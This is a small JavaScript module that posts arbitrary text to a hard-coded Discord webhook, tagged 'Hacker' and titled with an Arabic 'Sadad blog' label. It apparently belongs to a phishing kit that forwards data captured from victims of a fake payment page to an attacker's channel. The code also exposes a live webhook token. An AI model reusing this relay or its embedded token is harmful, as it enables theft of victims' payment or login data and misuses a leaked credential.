import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1319315283302809733/iwANsOVdevHQ4EEIrbigUgFNcEmzM9yQffLf5uAmco7LjuMxgzMuxBtP4hgQNs1hC7IN",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
